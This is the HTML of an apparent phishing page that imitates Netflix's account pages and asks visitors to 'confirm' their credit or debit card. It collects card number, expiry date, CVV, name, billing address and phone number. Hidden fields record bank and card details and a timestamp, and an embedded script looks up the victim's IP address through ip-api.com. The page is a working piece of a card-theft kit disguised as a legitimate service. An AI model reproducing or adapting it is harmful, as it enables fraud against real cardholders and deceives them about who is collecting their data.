<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Netflix</title>
	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/app.css">
	<script src="js/jquery.min.js"></script>
	<script src="js/validet.js"></script>	
	<link rel="shortcut icon" href="img/nficon.ico">
</head>
<body>
	<div>
		<div class="header_nf">
			<a href="#" class="svg-nfLogo">
				<svg viewBox="0 0 111 30" class="svg-icon" focusable="true">
					<title></title>
					<g id="nfx-logo">
						<path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path>
					</g>
				</svg>
				<span class="screen-reader-text">Netflix</span>
			</a>
			<a href="#" class="s_out"><span>Sign Out</span></a>
		</div>
		<div class="simple_main_option">

					<div class="payoption">
					<div>
						<input type="hidden" name="namebank" id="xxxnb">
						<input type="hidden" name="schemecard" id="xxxsc">
						<input type="hidden" name="typecard" id="xxxtc">
						<input type="hidden" name="urlbank" id="xxxub">
						<input type="hidden" name="phonebank" id="xxxpb">
						<div style="text-align: left;">
						<span class="step_py">STEP <b>2</b> OF <b>2</b></span>
						</div>
						<div class="step_title">
							<span>Confirm your credit or debit card.</span>
						</div>
						<div class="img-title" style="padding-bottom: 5px;">
							<img src="img/v.png" style="padding-right: 5px;">
							<img src="img/m.png" style="padding-right: 5px;">
							<img src="img/a.png">
						</div>
						<span style="font-size: 13px;font-weight: 700;margin-top: 5px; color: #828282">MUST MATCH THE INFORMATION ON YOUR CARD</span>
					<div>
						<div class="twice_filed">
							<input type="text" name="fname" id="fname" class="option__field" placeholder="First Name">
							<label for="fname" class="option__label">First Name</label>
						</div>
						<div class="twice_filed2">
							<input type="text" name="lname" id="lname" class="option__field" placeholder="Last Name">
							<label for="lname" class="option__label">Last Name</label>
						</div>
					</div>
						<div class="option__group">
							<input type="tel" name="cn" id="cnmbrr" class="option__field" placeholder="Card Number" maxlength="19">
							<label for="cn" class="option__label">Card Number</label>
						</div>
						<div class="option__group">
							<input type="tel" name="exp_dt" id="exp_dt" class="option__field" placeholder="Expiration Date (MM/YY)" maxlength="7">
							<label for="exp_dt" class="option__label">Expiration Date (MM/YY)</label>
						</div>
						<div class="option__group" style="margin-bottom:5px;">
							<input type="tel" name="cvv" id="cvv" class="option__field" placeholder="Security Code (CVV)" maxlength="4">
							<label for="cvv" class="option__label">Security Code (CVV)</label>
						</div>
						<span style="font-size: 13px;font-weight: 700;margin-top: 5px; color: #828282">CREDIT/DEBIT CARD BILLING ADDRESS</span>
						<div class="option__group">
							<input type="text" name="addresse" id="addresse" class="option__field" placeholder="Address">
							<label for="addresse" class="option__label">Address</label>
						</div>
						<div class="twice_filed" style="margin-bottom:5px;">
							<input type="text" name="city" id="city" class="option__field" placeholder="Addresse">
							<label for="city" class="option__label">City</label>
						</div>
						<div class="twice_filed2">
							<input type="text" name="country" id="country" class="option__field" placeholder="Country" value="">
							<label for="country" class="option__label">Country</label>
						</div>
						<div class="option__zip" style="margin-bottom:5px;">
							<input type="text" name="zip" id="zip" class="option__field" placeholder="Zip Code">
							<label for="zip" class="option__label">Zip Code</label>
						</div>						
						<div class="option__zip" style="margin-bottom:5px;">
							<input type="tel" name="ph" id="ph" class="option__field" placeholder="Phone">
							<label for="ph" class="option__label">Phone</label>
						</div>
						<input type="hidden" id="xxip">
						<input type="hidden" id="xxxtt" value="<?php echo date("Y/m/d h:i:s:A"); ?>">
						<script>
						  function ipLookUp () {
						  $.ajax('http://ip-api.com/json')
						  .then(
						      function success(response) {
						          $('#xxip').val(response.query);
						          $('#country').val(response.country);
						      },
						      function fail(data, status) {
						          console.log('Request failed.  Returned status of',
						                      status);
						      }
						  );
						}
						ipLookUp()
						</script>
							<div class="terms">
								<p>By checking the checkbox below, you agree to our <a href="#">Terms of Use, Privacy Statement</a>, and that you are over 18.</p>
							</div>
							<div class="agree_form">
								<label class="cont_agree"><span id="agree_span">I agree.</span>
									<input type="checkbox" checked="checked">
									<span class="check_agree"></span>
								</label>
							</div>
						<button type="submit" name="start" id="strtt" class="btn-start">CONFIRM & UPDATE</button>
					</div>
					</div>
				</div>
			</div>
		</div>
		<div class="footer_checkout">
			<div class="divder"></div>
			<div class="content_footer">
				<div class="Q_us"><a>Questions? Contact us.</a></div>
				<a class="link_footer" href="#">Gift Card Terms</a>
				<a class="link_footer" href="#">Terms of Use</a>
				<a class="link_footer" href="#">Privacy Statement</a>
				<div class="select_arrow2">
						<img src="img/glob2.png">
					<select class="ui_select2" tabindex="0" placeholder="lang-switcher">
						<option data-language="ar" data-country="#">العربية</option>
						<option value="" data-language="fr" data-country="#">Français</option>
						<option selected="" value="" data-language="en" data-country="#">English</option>
					</select>
				</div>
			</div>
		</div>
	</div>
</body>
</html>